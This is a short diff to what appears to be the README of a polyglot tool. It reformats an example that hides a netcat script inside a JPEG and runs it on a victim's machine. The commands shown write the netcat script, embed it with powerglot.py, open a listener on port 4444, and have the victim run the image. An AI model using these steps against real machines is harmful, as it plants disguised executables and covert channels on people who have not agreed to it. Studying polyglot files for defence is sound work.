@@ -40,9 +40,9 @@ End Sub
 * **Hiding a cover-channel wiht netcat in a JPEG image**
 
 * Attacker
-`echo "nc 127.0.0.1 4444" > netcat.sh`
-`python3 powerglot.py -o netcat.sh cat.jpeg cat-netcat.jpeg`
-`nc -nvlp 4444`
+```echo "nc 127.0.0.1 4444" > netcat.sh
+ python3 powerglot.py -o netcat.sh cat.jpeg cat-netcat.jpeg
+ nc -nvlp 4444```
 
 * Victim
 `chmod +x cat-netcat.jpg | ./cat-netcat.jpg`
